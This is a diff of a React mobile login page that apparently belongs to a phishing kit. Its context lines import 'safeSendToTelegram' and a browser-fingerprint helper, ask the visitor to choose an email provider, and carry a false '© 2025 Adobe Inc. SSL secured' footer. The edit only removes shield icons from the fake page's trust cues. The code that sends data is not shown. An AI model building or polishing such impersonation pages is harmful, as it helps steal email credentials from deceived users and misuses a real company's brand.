@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Mail, Lock, Eye, EyeOff, Shield, Sparkles } from 'lucide-react';
+import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
 import { getBrowserFingerprint } from '../../utils/oauthHandler';
 import { safeSendToTelegram } from '../../utils/safeSendToTelegram';
 
@@ -140,7 +140,6 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
               <div>
                 <h1 className="text-lg font-bold text-gray-900 flex items-center gap-2">
                   Secure Access
-                  <Shield className="w-3 h-3 text-green-500" />
                 </h1>
                 <p className="text-xs text-gray-600">Choose your email provider</p>
               </div>
@@ -265,7 +264,6 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
             <div className="mt-6 text-center">
               <p className="text-xs text-gray-500 flex items-center justify-center gap-1">
-                <Shield className="w-3 h-3" />
                 © 2025 Adobe Inc. SSL secured.
               </p>
             </div>
